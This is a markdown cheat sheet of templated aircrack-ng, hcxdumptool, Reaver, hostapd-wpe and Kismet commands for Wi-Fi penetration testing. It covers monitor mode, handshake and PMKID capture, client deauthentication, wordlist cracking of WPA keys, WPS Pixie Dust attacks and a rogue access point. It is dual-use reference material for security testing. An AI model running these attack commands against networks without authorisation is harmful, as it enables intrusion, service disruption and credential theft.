# Wifi

## monitor mode

### Kill conflicting processes

Run kill conflicting processes with Wifi.

Kill processes that interfere with monitor mode.

```sh title:"Wifi Run Kill Conflicting Processes"
airmon-ng check kill
```
<!-- cheat -->

### Start monitor mode

Start monitor mode with Wifi.

Start monitor mode on a wireless interface.

```sh title:"Wifi Start Monitor Mode"
airmon-ng start "$wlan_interface"
```
<!-- cheat
var wlan_interface := wlan0
-->

### Stop monitor mode

Run stop monitor mode with Wifi.

Stop monitor mode on a monitor interface.

```sh title:"Wifi Run Stop Monitor Mode"
airmon-ng stop "$wlanmon_interface"
```
<!-- cheat
var wlanmon_interface := wlan0mon
-->

### Restart NetworkManager

Start restart NetworkManager with Wifi.

Restart NetworkManager after monitor-mode work.

```sh title:"Wifi Start Restart NetworkManager"
systemctl restart NetworkManager
```
<!-- cheat -->

### Managed mode

Set managed mode with Wifi.

Set a wireless interface back to managed mode.

```sh title:"Wifi Set Managed Mode"
nmcli device set "$wlan_interface" managed true
```
<!-- cheat
var wlan_interface := wlan0
-->

## capture

### Monitor all

Run monitor all with Wifi.

Monitor nearby wireless networks.

```sh title:"Wifi Run Monitor All"
airodump-ng "$wlanmon_interface"
```
<!-- cheat
var wlanmon_interface := wlan0mon
-->

### Monitor BSSID

Run monitor BSSID with Wifi.

Capture traffic for one BSSID on a channel.

```sh title:"Wifi Run Monitor BSSID"
airodump-ng --bssid "$bssid" -c "$channel" -w "$output_file" "$wlanmon_interface"
```
<!-- cheat
var bssid
var channel
var output_file
var wlanmon_interface := wlan0mon
-->

### PMKID capture

Dump PMKID capture with Wifi.

Capture WPA PMKID material with hcxdumptool.

```sh title:"Wifi Dump PMKID Capture"
hcxdumptool -i "$wlanmon_interface" -o "$capture_file" --enable_status=1 -c "$channel"
```
<!-- cheat
var wlanmon_interface := wlan0mon
var capture_file := capture.pcapng
var channel
-->

### Convert hcx capture

Convert hcx capture with Wifi.

Convert a pcapng capture to hashcat 22000 format.

```sh title:"Wifi Convert Hcx Capture"
hcxpcapngtool -o "$hash_file" "$capture_file"
```
<!-- cheat
var hash_file := wifi.22000
var capture_file := capture.pcapng
-->

## attack

### Deauth client

Run deauth client with Wifi.

Send deauthentication frames to a client.

```sh title:"Wifi Run Deauth Client"
aireplay-ng --deauth "$deauth_count" -c "$client_mac" -a "$bssid" "$wlanmon_interface"
```
<!-- cheat
var deauth_count := 5
var client_mac
var bssid
var wlanmon_interface := wlan0mon
-->

### Crack PSK

Crack PSK with Wifi.

Crack a captured handshake with a wordlist.

```sh title:"Wifi Crack PSK"
aircrack-ng -w "$wordlist" "$capture_file"
```
<!-- cheat
var wordlist
var capture_file
-->

### WPS pixiedust

Execute WPS pixiedust with Wifi.

Run Reaver Pixie Dust attack.

```sh title:"Wifi Execute WPS Pixiedust"
reaver -i "$wlanmon_interface" -b "$bssid" -c "$channel" -Z
```
<!-- cheat
var wlanmon_interface := wlan0mon
var bssid
var channel
-->

### Fake AP

Start fake AP with Wifi.

Launch hostapd-wpe with a config.

```sh title:"Wifi Start Fake AP"
hostapd-wpe "$hostapd_conf"
```
<!-- cheat
var hostapd_conf := /etc/hostapd-wpe/hostapd-wpe.conf
-->

## monitor

### Kismet

Run kismet with Wifi.

Monitor WiFi with Kismet.

```sh title:"Wifi Run Kismet"
kismet -c "$wlan_interface"
```
<!-- cheat
var wlan_interface := wlan0
-->
